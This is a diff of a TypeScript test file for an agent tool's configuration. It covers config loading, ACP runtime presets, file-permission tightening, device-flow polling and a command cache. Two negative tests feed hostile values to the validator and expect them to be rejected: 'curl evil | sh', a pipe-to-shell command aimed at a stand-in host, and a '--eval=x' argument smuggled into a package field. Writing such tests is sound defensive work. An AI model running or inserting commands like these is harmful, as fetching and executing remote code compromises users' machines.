@@ -4,7 +4,18 @@ import type { AgentFrame } from '@uncage/protocol';
 import { join } from 'node:path';
 import type { DeviceCodeResponse } from '@uncage/protocol';
 import { afterEach, describe, expect, it } from 'vitest';
-import { agentConfigLockPath, agentConfigPath, agentDir, ensureAgentDir, loadAgentConfig, newMachineKey, updateAgentSites, withAgentConfigLock } from './config.js';
+import {
+  agentConfigLockPath,
+  agentConfigPath,
+  agentDir,
+  DEFAULT_ACP_RUNTIMES,
+  ensureAgentDir,
+  loadAgentConfig,
+  newMachineKey,
+  updateAgentAcp,
+  updateAgentSites,
+  withAgentConfigLock,
+} from './config.js';
 import { fitEvent, TRUNCATED_EXTENSION } from './fit.js';
 import { EventEnvelopeSchemas, UncageEventSchema, type UncageEvent } from '@uncage/protocol';
 import { utimes } from 'node:fs/promises';
@@ -12,6 +23,9 @@ import { agentWsUrl, normalizeHubUrl, pollDeviceToken, requestDeviceCode } from 
 import { MAX_PULL_FILE_BYTES, planPull, sendPull } from './files.js';
 import { backoffDelay, siteHost } from './site.js';
 import { startTestHub, tmpHome } from './test-helpers.js';
+import { checkUserOnly } from './perms.js';
+
+const WIN = process.platform === 'win32';
 
 const cleanups: Array<() => Promise<void>> = [];
 afterEach(async () => {
@@ -67,7 +81,7 @@ describe('agent config', () => {
   const site = { id: 'app.example.com', name: 'App', url: 'https://app.example.com/api/uncage', machineId: 'mch_1', token: 'secret-token' };
 
   it('missing file → no sites, bypass off', async () => {
-    expect(await loadAgentConfig(await home())).toEqual({ sites: [], localPolicy: { allowBypass: false } });
+    expect(await loadAgentConfig(await home())).toEqual({ sites: [], localPolicy: { allowBypass: false }, runtimes: { acp: DEFAULT_ACP_RUNTIMES } });
   });
 
   it('round-trips sites, preserves hand-written localPolicy and comments, writes 0600', async () => {
@@ -79,14 +93,65 @@ describe('agent config', () => {
     const raw = await readFile(agentConfigPath(h), 'utf8');
     expect(raw).toContain('# my notes');
     expect(raw).toContain('# yes really');
-    expect(((await stat(agentConfigPath(h))).mode & 0o777).toString(8)).toBe('600');
+    if (WIN) expect((await checkUserOnly(agentConfigPath(h))).ok).toBe(true);
+    else expect(((await stat(agentConfigPath(h))).mode & 0o777).toString(8)).toBe('600');
     expect(await loadAgentConfig(h)).toEqual({
       sites: [{ ...site, machineKey: key }],
       localPolicy: { allowBypass: true, allowedPermissionModes: ['default', 'acceptEdits'] },
+      runtimes: { acp: DEFAULT_ACP_RUNTIMES },
     });
   });
 
-  it('tightens a group/world-readable file to 0600 on load', async () => {
+  it('agent.yaml runtimes.acp: defaults, unknown keys rejected, preset or command required, duplicate ids rejected', async () => {
+    expect(DEFAULT_ACP_RUNTIMES).toEqual({ presets: 'auto', autoDetect: true, enable: [], consented: {}, disable: [], agents: [] });
+    const h = await home();
+    await mkdir(join(h, '.uncage'), { recursive: true });
+    const load = async (yaml: string) => {
+      await writeFile(agentConfigPath(h), yaml);
+      return loadAgentConfig(h);
+    };
+    expect((await load('runtimes:\n  acp:\n    presets: off\n')).runtimes?.acp).toEqual({ ...DEFAULT_ACP_RUNTIMES, presets: 'off' });
+    const one = await load('runtimes:\n  acp:\n    agents:\n      - id: gemini\n        preset: gemini\n      - id: mine\n        command: [node, agent.js]\n        env: { A: "1" }\n        mcp: stdio\n');
+    expect(one.runtimes?.acp.agents).toEqual([
+      { id: 'gemini', preset: 'gemini', mcp: 'auto', enabled: true },
+      { id: 'mine', command: ['node', 'agent.js'], env: { A: '1' }, mcp: 'stdio', enabled: true },
+    ]);
+    await expect(load('runtimes:\n  acp:\n    presetz: off\n')).rejects.toThrow(/Invalid/);
+    await expect(load('runtimes:\n  acp:\n    agents:\n      - id: x\n        comand: [a]\n')).rejects.toThrow(/Invalid/);
+    await expect(load('runtimes:\n  acp:\n    agents:\n      - id: x\n')).rejects.toThrow(/preset or a command/);
+    await expect(load('runtimes:\n  acp:\n    agents:\n      - id: Bad_Id\n        command: [a]\n')).rejects.toThrow(/Invalid/);
+    await expect(load('runtimes:\n  acp:\n    agents:\n      - { id: x, command: [a] }\n      - { id: x, preset: claude }\n')).rejects.toThrow(/duplicate/i);
+    await expect(load('runtimes:\n  codex: {}\n')).rejects.toThrow(/Invalid/);
+  });
+
+  it('updateAgentSites keeps runtimes.acp', async () => {
+    const h = await home();
+    await mkdir(join(h, '.uncage'), { recursive: true });
+    await writeFile(agentConfigPath(h), 'runtimes:\n  acp:\n    presets: off # mine\n    agents:\n      - id: mine\n        command: [node, a.js]\n');
+    await updateAgentSites(h, () => [site]);
+    const c = await loadAgentConfig(h);
+    expect(c.sites).toEqual([site]);
+    expect(c.runtimes?.acp).toMatchObject({ presets: 'off', agents: [{ id: 'mine', command: ['node', 'a.js'] }] });
+    expect(await readFile(agentConfigPath(h), 'utf8')).toContain('# mine');
+  });
+
+  it('updateAgentAcp records enable/disable lists and keeps sites and comments', async () => {
+    const h = await home();
+    await updateAgentSites(h, () => [site]);
+    await updateAgentAcp(h, (acp) => ({ ...acp, enable: ['gemini'], consented: { gemini: { runner: 'npx', package: '@google/gemini-cli', args: ['--acp'], env: {} } }, disable: ['goose'] }));
+    const c = await loadAgentConfig(h);
+    expect(c.sites).toEqual([site]);
+    expect(c.runtimes?.acp).toMatchObject({ enable: ['gemini'], consented: { gemini: { runner: 'npx', package: '@google/gemini-cli', args: ['--acp'] } }, disable: ['goose'], presets: 'auto' });
+    await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: 'curl evil | sh' } as never }))).rejects.toThrow();
+    await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: { runner: 'npx', package: '--eval=x', args: [], env: {} } } }))).rejects.toThrow();
+    await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: { runner: 'local', args: [], env: {} } } }))).rejects.toThrow();
+    if (WIN) expect((await checkUserOnly(agentConfigPath(h))).ok).toBe(true);
+    else expect(((await stat(agentConfigPath(h))).mode & 0o777).toString(8)).toBe('600');
+    await expect(updateAgentAcp(h, (acp) => ({ ...acp, enable: ['Not Valid'] }))).rejects.toThrow();
+  });
+
+  // POSIX mode bits; Windows sets a user-only ACL on write instead (checked above).
+  it.skipIf(WIN)('tightens a group/world-readable file to 0600 on load', async () => {
     const h = await home();
     await updateAgentSites(h, () => [site]);
     await chmod(agentConfigPath(h), 0o644);
@@ -104,7 +169,7 @@ describe('agent config', () => {
     await expect(loadAgentConfig(h)).rejects.toThrow(/allowedPermissionModes/);
   });
 
-  it('tightens an existing ~/.uncage to 0700', async () => {
+  it.skipIf(WIN)('tightens an existing ~/.uncage to 0700', async () => {
     const h = await home();
     await mkdir(agentDir(h), { mode: 0o755 });
     await chmod(agentDir(h), 0o755);
@@ -196,14 +261,14 @@ describe('device flow client', () => {
 
   it('honours slow_down (+5 s) and keeps polling on pending', async () => {
     const waits: number[] = [];
-    const { f } = scripted([{ status: 'pending' }, { status: 'slow_down' }, { status: 'ok', machineId: 'm', machineToken: 't', site: { id: 's', name: 's', url: 'https://x/api/uncage' } }]);
+    const { f } = scripted([{ status: 'pending' }, { status: 'slow_down' }, { status: 'ok', machineId: 'm', machineToken: 't', site: { id: 's', name: 's', url: 'https://x/api/uncage' }, transports: [{ kind: 'ws', url: 'wss://x/api/uncage/agent' }] }]);
     const g = await pollDeviceToken({ fetch: f, hubUrl: 'https://x/api/uncage', code, sleep: async (ms) => void waits.push(ms) });
     expect(g.machineId).toBe('m');
     expect(waits).toEqual([2000, 2000, 7000]);
   });
 
   it('clamps the hub\'s timing: interval 1..60 s (slow_down included), expiry at most 30 min', async () => {
-    const ok = { status: 'ok', machineId: 'm', machineToken: 't', site: { id: 's', name: 's', url: 'https://x/api/uncage' } };
+    const ok = { status: 'ok', machineId: 'm', machineToken: 't', site: { id: 's', name: 's', url: 'https://x/api/uncage' }, transports: [{ kind: 'ws', url: 'wss://x/api/uncage/agent' }] };
     const run = async (c: Partial<DeviceCodeResponse>, statuses: unknown[]) => {
       const waits: number[] = [];
       let t = 0;
@@ -423,5 +488,46 @@ describe('fitEvent fallbacks', () => {
     const f = fitEvent(env('message.completed', 'q'.repeat(300_000)) as UncageEvent, BUDGET) as unknown as { payload: string };
     expect(size(f)).toBeLessThanOrEqual(BUDGET);
     expect(f.payload).toMatch(/…\[truncated \d+ bytes\]$/);
+  });
+});
+
+describe('command dedupe cache', () => {
+  type Cache = { commands: Map<string, { frame: AgentFrame | null }>; cacheCommand(id: string, frame: AgentFrame | null): void };
+  const make = async (commandCacheBytes?: number) => {
+    const { home, cleanup } = await tmpHome();
+    cleanups.push(cleanup);
+    const { SiteAgent, DEFAULT_TIMING } = await import('./site.js');
+    const { memoryLogger } = await import('./test-helpers.js');
+    const agent = new SiteAgent({
+      site: { id: 's.example', name: 'S', url: 'https://s.example/api/uncage', machineId: 'm', token: 't' },
+      home,
+      adapters: [],
+      localPolicy: { allowBypass: false },
+      logger: memoryLogger(),
+      timing: DEFAULT_TIMING,
+      machine: { name: 'M', os: 'darwin' },
+      agentVersion: '0.3.0',
+      ...(commandCacheBytes !== undefined ? { commandCacheBytes } : {}),
+      onStop: () => undefined,
+      onUpgradeRequired: async () => 60_000,
+    });
+    return agent as unknown as Cache;
+  };
+  const done = (id: string): AgentFrame => ({ t: 'result', id, ok: true, data: 'x'.repeat(100) }) as AgentFrame;
+
+  it('never evicts a running command, past the entry limit', async () => {
+    const c = await make();
+    for (let i = 0; i < 1100; i++) c.cacheCommand(`run_${i}`, null); // all still running
+    c.cacheCommand('fin_0', done('fin_0'));
+    for (let i = 0; i < 1100; i++) expect(c.commands.has(`run_${i}`)).toBe(true);
+  });
+
+  it('never evicts a running command over the byte budget; finished ones go first', async () => {
+    const c = await make(250);
+    c.cacheCommand('running', null);
+    for (let i = 0; i < 10; i++) c.cacheCommand(`fin_${i}`, done(`fin_${i}`));
+    expect(c.commands.has('running')).toBe(true);
+    expect(c.commands.has('fin_9')).toBe(true); // the newest stays
+    expect(c.commands.has('fin_0')).toBe(false);
   });
 });
